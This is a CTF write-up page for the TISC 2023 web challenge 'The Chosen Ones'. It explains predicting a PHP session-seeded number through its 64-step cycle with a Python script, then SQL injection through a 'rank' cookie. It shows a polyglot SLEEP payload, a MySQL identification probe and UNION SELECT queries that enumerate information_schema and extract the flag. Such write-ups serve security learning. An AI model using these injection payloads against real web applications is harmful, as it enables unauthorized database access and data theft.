mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 4</span></a><a href="/ctf-writeups/palindromes-invitation" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 5</span></a><a aria-current="page" href="/ctf-writeups/the-chosen-ones" class="router-link-active router-link-exact-active group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-primary" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10 text-primary">Level 6</span></a><a href="/ctf-writeups/devsecmeow" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 7</span></a><a href="/ctf-writeups/blind-sql-injection" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 8</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">LITCTF 2023</span><!--[--><a href="/ctf-writeups/the-other-obligatory-pyjail" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">the other obligatory pyjail</span></a><!--]--></div><!--]--></div><div class="dotted-line-vert h-auto mb-10"></div></div><div class="relative flex flex-col items-center break-words max-w-[89rem] mx-auto px-[20.5rem] pt-24 pb-14 max-xl:ml-0 max-xl:pl-12 max-lg:mr-0 max-lg:pr-12 max-md:px-8 max-sm:px-5"><div class="w-full flex flex-col items-start"><span class="text-xl opacity-60 mb-1">03/10/2023</span><h1 class="mb-7">The Chosen Ones</h1><div class="markdown mb-7 flex flex-col gap-y-3"><p>We have discovered PALINDROME's recruitment site. Infiltrate it and see what you can find!</p>
<p><a href="http://chals.tisc23.ctf.sg:51943">http://chals.tisc23.ctf.sg:51943</a></p>
</div><div class="flex flex-wrap gap-3"><!--[--><div class="h-9 bg-white rounded-full flex items-center"><i class="material-symbols-outlined text-xl ml-3 mr-2 text-black">language</i><span class="mr-4 text-black font-semibold">web</span></div><!--]--><div class="h-9 bg-almost-black rounded-full px-5 flex items-center"><span class="mr-4">52 solves</span><span class="opacity-60">0 points</span></div><div class="h-9 bg-almost-black rounded-full flex items-center"><i class="material-symbols-outlined text-xl ml-3 mr-3">person</i><span class="mr-4">by unknown</span></div></div><div class="dotted-line-hori self-stretch w-auto mx-4 mt-10 mb-7 max-md:mx-0"></div></div><div id="article" class="markdown w-full flex flex-col gap-y-3 px-4 max-md:px-0"><p>Overall, I feel this challenge was comparitively straightforward and provided some respite from the previous challenges.</p>
<p>We are asked to guess a number on the landing page, and the number seems to be randomly generated each time:</p>
<p><img src="/ctf-writeups/tisc23/the-chosen-ones-first.png" alt="number guessing page"></p>
<p>Initially, I assumed the php <code>rand()</code> function was being used, and spent sometime researching on methods to predict the next random value based on previous outputs. This was largely unsuccessful. However, I eventually realised the source code for generating the 6 digit number was provided in a base32 encoded comment in the html.</p>
<pre><code class="language-php">function random() {
  $prev = $_SESSION["seed"];
  $current = (int)$prev ^ 844742906;
  $current = decbin($current);
  while (strlen($current) &lt; 32) {
    $current = "0" . $current;
  }
  $first = substr($current, 0, 7);
  $second = substr($current, 7, 25);
  $current = $second . $first;
  $current = bindec($current);
  $_SESSION["seed"] = $current;
  return $current % 1000000;
}
</code></pre>
<p>After studying this function for a while, I realised it produces a sequence that eventually repeats after being run a certain number of times due to the way the string is being rotated and xored. I wrote some code to check this:</p>
<pre><code class="language-php">$a = random();
for ($i = 1; ; $i++) {
  if (random() == $a) {
    echo $i . "\n";
    break;
  }
}
</code></pre>
<p>This printed 64. So the first number will be the same as the 65th number produced. I wrote a python script:</p>
<pre class="named-fence-block"><code class="language-python">import requests
import re

sess = requests.Session()

sess.get('http://chals.tisc23.ctf.sg:51943/index.php')

resp = sess.get('http://chals.tisc23.ctf.sg:51943/index.php?entry=aoeu')
a = int(re.search('The lucky number was (\d+?)&lt;BR&gt;', resp.text).group(1))

for _ in range(63):
    sess.get('http://chals.tisc23.ctf.sg:51943/index.php?entry=aoeu')

resp = sess.get('http://chals.tisc23.ctf.sg:51943/index.php?entry=' + str(a))
print(resp.text)

print(sess.cookies.get_dict())

sess.close()
</code><div class="named-fence-filename">s.py</div></pre>
<pre><code class="language-plaintext">&lt;center&gt;
Personnel List &lt;br&gt;
&lt;iframe src="table.php" title="personnel" width="750" height="1500" frameBorder="0"&gt;
&lt;/center&gt;

{'PHPSESSID': 'srav744br8cui13r6dgb15j2cv', 'rank': '0'}
</code></pre>
<p>I copied the <code>PHPSESSID</code> and <code>rank</code> cookies into Chrome, and viewed <code>/table.php</code>.</p>
<p><img src="/ctf-writeups/tisc23/the-chosen-ones-table.png" alt="table"></p>
<p>I tried some standard sql injection payloads such as <code>' or 1=1;--</code>, however they didn't seem to work. I then tried a polyglot injection payload I found on PayloadAllTheThings:</p>
<pre><code class="language-sql">SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
</code></pre>
<p>This yielded no results on both the username and password fields.</p>
<p>Then I remembered the strange <code>rank</code> cookie and tried to figure out what it did. I changed the value to 1, and this time the table was larger:</p>
<p><img src="/ctf-writeups/tisc23/the-chosen-ones-table-2.png" alt="table"></p>
<p>Changing the value to 2, I could see more rows with users of rank 2 as well. So rank is probably included in the sql query as well and a possible vector for sql injection. I set rank to the polyglot injection payload above and sent another request. This time, the request returned a server error after a while, so the sql injection was successful.</p>
<p>Next, I had to identify the type of database. Referring to this <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification">list of payloads</a>, I sent <code>rank=1 and conv('a',16,2)=conv('a',16,2);--</code> and it succeeded, showing that the underlying database is MySQL.</p>
<p>Next, we have to extract information about the db schema. Following <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#extract-database-with-information_schema">this section</a>, I sent a request with <code>rank=-1 union select schema_name, 1, 1, 1 from information_schema.schemata;--</code></p>
<p>There are 3 schemas, <code>information_schema</code>, <code>palindrome</code>, and <code>performance_schema</code>. palindrome seems to be what we want, so I listed the tables there with <code>rank=-1 union select table_name, 1, 1, 1 from information_schema.tables where table_schema = "palindrome";--</code>.</p>
<p>There were 2 tables, <code>CTF_SECRET</code> and <code>PERSONNEL</code>. I listed the columns in the <code>CTF_SECRET</code> table using <code>rank=-1 union select column_name, 1, 1, 1 from information_schema.columns where table_name = "CTF_SECRET";--</code>. There was only one column: <code>flag</code>.</p>
<p>I sent my final request with <code>rank=-1 union select flag, 1, 1, 1 from palindrome.CTF_SECRET;--</code>, and got the flag: <code>TISC{Y0u_4rE_7h3_CH0s3n_0nE}</code>.</p>
</div><div class="fixed w-[17.5rem] h-full top-0 right-0 pointer-events-none pr-8 max-lg:hidden"><!----></div></div><!----></div></div>
    
  

</body></html>